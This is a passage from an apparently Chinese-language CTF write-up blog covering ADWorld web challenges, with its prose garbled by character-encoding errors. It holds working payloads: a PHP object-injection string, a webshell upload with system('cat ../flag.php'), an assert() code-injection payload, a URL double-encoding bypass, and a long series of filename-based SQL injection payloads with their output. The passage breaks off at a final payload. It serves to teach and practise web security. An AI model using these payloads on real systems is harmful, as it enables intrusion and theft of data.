<p>3ã€æœ€ç»ˆçš„payloadï¼š<code>?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503010254761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><br></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>1ã€è¿›å…¥é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢ï¼Œä¸”åªå…è®¸ä¸Šä¼ å›¾ç‰‡ã€‚<img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503203530747.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2ã€å› ä¸ºæ˜¯å‰ç«¯æ£€éªŒï¼Œç›´æ¥ä¸Šä¼ <code>shell.jpg</code>ï¼ŒBurpSuiteæŠ“åŒ…æ”¹åç¼€ä¸º<code>.php</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503203700124.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>3ã€è¿æ¥shellï¼Œåœ¨ä¸Šä¸€æ¬¡ç›®å½•é‡Œå‘ç°<code>flag.php</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503203746240.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>4ã€å†ä¼ å…¥<code>pass=system(&#39;cat ../flag.php&#39;);</code>ï¼Œåœ¨æºç é‡Œå¾—åˆ°flagã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503203947402.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="mfwï¼ˆcsaw-ctf-2016-qualsï¼‰"><a href="#mfwï¼ˆcsaw-ctf-2016-qualsï¼‰" class="headerlink" title="mfwï¼ˆcsaw-ctf-2016-qualsï¼‰"></a>mfwï¼ˆcsaw-ctf-2016-qualsï¼‰</h1><p>1ã€è¿›å…¥é¢˜ç›®ï¼Œåœ¨<code>About</code>é¡µé¢çœ‹åˆ°å‡ºé¢˜è€…ä½¿ç”¨äº†<code>Git</code>ï¼Œå†é€šè¿‡æ‰«æç›®å½•ç¡®è®¤å­˜åœ¨<code>Git</code>æ³„éœ²ï¼Œåˆ©ç”¨GitHackå·¥å…·å¾—åˆ°æºç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/201905032118369.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€æºç é‡Œæœ‰<code>flag.php</code>æ–‡ä»¶ï¼Œä½†æ˜¯é‡Œé¢å¹¶æ²¡æœ‰flagï¼Œä»£ç å®¡è®¡ï¼Œåœ¨<code>index.php</code>é‡Œå‘ç°äº†é—®é¢˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">....................html code</span><br><span class="line"></span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				<span class="keyword">require_once</span> <span class="variable">$file</span>;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">		</span><br></pre></td></tr></table></figure>

<p>3ã€å‘ç°<code>assert()</code>å‡½æ•°é‡Œï¼Œæœ‰æˆ‘ä»¬å¯æ§çš„å‚æ•°<code>$page</code>ï¼Œè€Œä¸”å¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œ**<code>assert()</code>å‡½æ•°åœ¨éªŒè¯æ–­è¨€ä¹‹å‰å°†å…¶å‚æ•°è§£é‡Šä¸ºPHPä»£ç **ã€‚</p>
<p>å› æ­¤æ„é€ å¦‚ä¸‹<strong>payload</strong>ï¼š<code>&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>è¿™æ ·ï¼Œæ³¨å…¥åçš„è¯­å¥å°±å˜æˆäº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/ &#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);// .php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>//</code>åé¢çš„è¯­å¥åˆ™è¢«æ³¨é‡Šæ‰äº†ã€‚</p>
<p>å¾—åˆ°flagï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503215157117.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p>1ã€è¿›å…¥é¢˜ç›®åï¼Œç•Œé¢å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503220927234.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯´å®è¯ï¼Œæˆ‘å¡äº†å¾ˆä¹…æ— ä»ä¸‹æ‰‹ï¼Œæœ€åå¾—çŸ¥æ˜¯è®¿é—®<code>index.phps</code>é¡µé¢ï¼Œè¯´æ˜¯çœ‹æºç ï¼Œä½†æˆ‘å…¶å®å¹¶æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆâ€¦</p>
<p>2ã€è®¿é—®<code>index.phps</code>,çœ‹åˆ°å¦‚ä¸‹æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3ã€ç®€å•çš„ä»£ç å®¡è®¡ï¼Œæµè§ˆå™¨å’Œä»£ç éƒ½å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†å¯¹<code>urldecode</code>ï¼Œå› æ­¤åªè¦å¯¹ä¼ å…¥çš„<code>admin</code>è¿›è¡Œä¸¤æ¬¡<code>urlencode</code>ã€‚<br>æ„é€ payloadï¼š<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190503222010535.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="FlatScienceï¼ˆHack-lu-2017ï¼‰"><a href="#FlatScienceï¼ˆHack-lu-2017ï¼‰" class="headerlink" title="FlatScienceï¼ˆHack.lu-2017ï¼‰"></a>FlatScienceï¼ˆHack.lu-2017ï¼‰</h1><p>1ã€é¦–å…ˆè®¿é—®<code>robots.txt</code>é¡µé¢ï¼Œå‘ç°æç¤ºäº†æœ‰<code>/login.php</code>å’Œ<code>/admin.php</code>ä¸¤ä¸ªé¡µé¢ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019050923484960.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2ã€åœ¨<code>login.php</code>ä¸­F12å‘ç°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190510000045729.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>äºæ˜¯å°è¯•<code>?debug</code>å¯ä»¥å¾—åˆ°æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">-------------------------------------</span><br><span class="line">              html code</span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123; </span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]; </span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>); </span><br><span class="line">         </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123; </span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123; </span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>); </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>])) </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>æ•°æ®åº“æŸ¥è¯¢çš„è¯­å¥ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,name <span class="keyword">from</span> Users <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;sha1($pass.&quot;Salz!&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡POSTæ¥æ”¶usrå’Œpwå‚æ•°ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œå¸¦å…¥sqlæŸ¥è¯¢ã€‚è‹¥æŸ¥è¯¢çš„ç»“æœidå­—æ®µä¸ä¸ºç©ºï¼Œåˆ™æ‰§è¡Œsetcookieæ“ä½œï¼Œä¼šå°†æŸ¥è¯¢çš„ç»“æœnameå­—æ®µæ’å…¥åˆ°cookieä¸­ã€‚</p>
<p>ä¸Šè¿°è¯­å¥ä¸­çš„<code>$user</code>æ˜¯å¯æ§çš„ï¼Œå³loginé¡µé¢ä¸­idè¾“å…¥æ¡†ä¸­çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ³¨å…¥å°†åé¢çš„è¯­å¥æ³¨é‡Šæ‰ï¼Œè¿™æ ·å­å°±å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚</p>
<br>

<h1 id="uploadï¼ˆRCTF-2015ï¼‰"><a href="#uploadï¼ˆRCTF-2015ï¼‰" class="headerlink" title="uploadï¼ˆRCTF 2015ï¼‰"></a>uploadï¼ˆRCTF 2015ï¼‰</h1><p>1ã€å…ˆè¿›å…¥é¡µé¢å‘ç°æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œæ³¨å†Œè´¦å·è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¹‹åä¼šå…ˆè¿”å›æˆåŠŸä¸Šä¼ å¹¶å›æ˜¾ä½ çš„<code>uid</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019051814501943.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå†å›åˆ°ä¸Šä¼ é¡µé¢å‘ç°ä½ ä¸Šä¼ çš„æ–‡ä»¶åä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œè¿™ç§æƒ…å†µåˆ¤æ–­æ˜¯å¦ç”±æ–‡ä»¶åå¯¼è‡´xssæˆ–è€…æ–‡ä»¶åçš„æ³¨å…¥ï¼ŒæŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°æ–‡ä»¶åä¸­çš„å¼•å·ç­‰ç¬¦å·ä¼šè¢«è½¬ä¹‰ï¼Œå› æ­¤æ’é™¤äº†xssã€‚</p>
<p>å¹¶ä¸”é€šè¿‡å›æ˜¾çš„æ–‡ä»¶åå¯ä»¥åˆ¤æ–­ï¼Œè¿‡æ»¤äº†<code>select</code>,<code>from</code>ç­‰å…³é”®è¯ï¼ˆé€šè¿‡åŒå†™ç»•è¿‡ï¼‰ï¼Œè¿™æ ·å°±æ˜ç¡®äº†åˆ©ç”¨æ–‡ä»¶åè¿›è¡Œæ³¨å…¥ã€‚</p>
<p>2ã€æ³¨å…¥å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼Œå³æœªçŸ¥è¡¨çš„ç»“æ„å’Œå·²çŒœæµ‹åˆ°è¡¨çš„ç»“æ„ï¼ˆæŸå¤§ä½¬writeupä¸­ï¼‰ã€‚</p>
<p>ï¼ˆ1ï¼‰å½“ä½ ä¸çŸ¥é“è¡¨çš„ç»“æ„æ—¶ï¼Œåªèƒ½å…ˆå¤§è‡´æ¨æµ‹åå°çš„insertæ’å…¥è¯­å¥ï¼š<br><code>insert into è¡¨å(&#39;filename&#39;,...) values(&#39;ä½ ä¸Šä¼ çš„æ–‡ä»¶å&#39;,...);</code></p>
<p>è¿™æ ·å¯ä»¥<strong>æ„é€ </strong>ä¸‹åˆ—æ–‡ä»¶åè¿›è¡Œæ³¨å…¥ï¼š<br><code>æ–‡ä»¶å&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg</code></p>
<p>æ‹¼æ¥åçš„sqlè¯­å¥ä¸ºï¼š<br><code>...values(&#39;æ–‡ä»¶å&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg&#39;,...);</code></p>
<ul>
<li>è¿™é‡Œ<code>hex()</code>å‡½æ•°å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œè€Œ<code>conv(str,16,10)</code>åˆ™å°†strç”±16è¿›åˆ¶å†è½¬æ¢ä¸º10è¿›åˆ¶</li>
<li>ç„¶ååˆ©ç”¨äº†mysqlçš„éšå¼ç±»å‹è½¬æ¢ï¼Œå…¶å®å°±æ˜¯å½“å­—ç¬¦ä¸²ä¸æ•´æ•°ç›¸åŠ æ—¶ï¼Œä¼šå½“ä½œæ•´æ•°æ¥è§£é‡Šï¼Œä¾‹å¦‚ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190518145705642.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li>
<li>è€Œä¹‹æ‰€ä»¥è¿˜è¦ç”¨åˆ°<code>substr()</code>æ˜¯å› ä¸ºå½“æŸ¥è¯¢çš„å­—ç¬¦ä¸²å¤ªé•¿æ—¶ï¼Œè½¬æ¢ä¸º10è¿›åˆ¶å°±ä¼šç”¨ç§‘å­¦è®°æ•°æ³•æ¥è¡¨ç¤ºï¼Œè¿™æ ·å°±æ²¡åŠæ³•å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²äº†ï¼Œå› æ­¤éœ€è¦ç”¨<code>substr()</code>æ¥å°†é•¿å­—ç¬¦ä¸²åˆ†æ®µè¿›è¡ŒæŸ¥è¯¢ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190518145924663.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li>
</ul>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥ä¸€æ­¥æ­¥çš„æŸ¥è¯¢åˆ°flagäº†ã€‚</p>
<p>å…¨éƒ¨payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰æŸ¥è¯¢æ•°æ®åº“:</span><br><span class="line">lethe &#x27;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">131277325825392 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šweb_up</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(selselectect conv(substr(hex(database()),13,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">1819238756 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šload</span><br><span class="line"></span><br><span class="line">æ‹¼æ¥èµ·æ¥å¾—çŸ¥æ•°æ®åº“åä¸º:web_upload</span><br><span class="line"></span><br><span class="line">ï¼ˆ2ï¼‰ç„¶åæŸ¥è¡¨:</span><br><span class="line">lethe&#x27;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = &#x27;web_upload&#x27; limit 1,1)),1,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">114784820031327 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šhello_</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+conv(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit 1,1)),13,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">112615676665705 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šflag_i</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit 1,1)),25,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">126853610566245 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šs_here</span><br><span class="line"></span><br><span class="line">æ‹¼æ¥èµ·æ¥å¾—çŸ¥å­˜æ”¾flagçš„è¡¨åä¸º: hello_flag_is_here</span><br><span class="line"></span><br><span class="line">(3)ç„¶åæŸ¥è¿™ä¸ªè¡¨é‡Œæœ‰ä»€ä¹ˆå­—æ®µ:</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit 0,1)),1,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">115858377367398 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼ši_am_f</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit 0,1)),13,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">7102823 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šlag</span><br><span class="line"></span><br><span class="line">æ‹¼æ¥èµ·æ¥å¾—çŸ¥å­˜æ”¾flagçš„å­—æ®µæ˜¯:i_am_flag</span><br><span class="line"></span><br><span class="line">(4)ç„¶åæŸ¥è¯¢flag:</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">36427215695199 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼š!!_@m_</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">92806431727430 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼šTh.e_F</span><br><span class="line"></span><br><span class="line">lethe&#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;.jpg</span><br><span class="line">è¿”å›:</span><br><span class="line">560750951 è½¬16è¿›åˆ¶å†è½¬å­—ç¬¦å¾—ï¼š!lag</span><br><span class="line"></span><br><span class="line">æ‹¼èµ·æ¥ä¹‹åå¾—åˆ°flag: !!_@m_Th.e_F!lag</span><br></pre></td></tr></table></figure>

<p>(2)ç¬¬äºŒç§æ–¹å¼ï¼Œå½“ä½ å·²ç»çŒœå‡ºäº†è¡¨çš„ç»“æ„å¾—é€‚åˆï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼ŒæŸä½å¤§ä½¬çš„wpä¸­å†™å‡ºäº†è¡¨çš„ç»“æ„ä¸ºï¼š<code>(filename,uid,uid)</code><br>å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¾—åˆ°è‡ªå·±çš„<code>uid</code>:</p>
<p>è¿™æ ·å°±å¯ä»¥æ„é€ ï¼š<br><code>æ–‡ä»¶å&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)#.jpg</code></p>
<p>æ‹¼æ¥åä¸ºï¼š<br><code>...values (&#39;æ–‡ä»¶å&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)#.jpg     &#39;,&#39;uid&#39;,&#39;uid&#39;);</code><br>å³ï¼š<br><code>...values (&#39;æ–‡ä»¶å&#39;,&#39;uid&#39;,&#39;uid&#39;),((database()),&#39;uid&#39;,&#39;uid&#39;)</code></p>
<p>è¿™æ ·å†æ’å…¥çš„æ—¶å€™å°±ä¼šå¤šæ’å…¥ä¸€åˆ—ï¼Œè¿™æ ·å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚</p>
<p>å¦‚payloadï¼š<code>lethe&#39;,&#39;1665&#39;,&#39;1665&#39;),((database()),&#39;1665&#39;,&#39;1665&#39;)#.jpg</code><br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190518153226488.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æœ€ç»ˆpayload</strong>ï¼šï¼ˆæˆ‘çš„uidä¸º1665ï¼‰</p>
